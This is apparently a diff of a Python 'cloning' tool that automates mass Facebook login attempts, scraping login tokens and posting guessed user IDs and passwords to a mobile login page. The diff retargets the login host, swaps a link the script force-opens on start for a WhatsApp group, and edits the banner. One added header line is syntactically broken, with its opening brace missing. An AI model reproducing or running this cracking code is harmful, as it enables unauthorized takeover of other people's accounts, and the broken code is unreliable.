@@ -158,7 +158,7 @@ class MIRAJ:
             time.sleep(0.009)
 print('𝙁𝙊𝙇𝙇𝙊𝙒 𝙈𝙔  𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙂𝙍𝙊𝙐𝙋 𝘽𝙍𝙊 𝙅𝙐𝙎𝙏 𝙒𝘼𝙄𝙏🐸🐸')  
 print(' MIRAJ 𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦 𝗦𝗧𝗔𝗥𝗧 𝗡𝗢𝗪 𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧✅✅ ')        
-os.system('xdg-open https://www.facebook.com/groups/103481142777502/?ref=share_group_link/')          
+os.system('xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd')          
 logo =("""
 \t\033[38;5;46m╔══════════════════════════════════╗
 \t\033[38;5;46m║\033[38;5;46m███    ███ ██    ██    ██       ██████  ██    ██ ███████ \33[38;5;196m\033[34;1m\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
@@ -178,7 +178,7 @@ logo =("""
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+𝟴𝟴𝟬𝟭780782237\33[38;5;196m     ┃
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : [★]𝗥𝟰𝗡𝗗𝗢𝗠-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\33[38;5;196m     ┃
 \33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]TRIAL-𝗩IP\33[38;5;196m            ┃
- \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31mM+K\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""")
+ \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31mPOM POM LOVER🤣\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""")
  
 # APK CHECK
 
@@ -252,7 +252,7 @@ def rcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen5)
             bi = random.choice([P,M,K,B,U,O,N,H])
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -263,7 +263,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = 'authority': 'mbasic.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
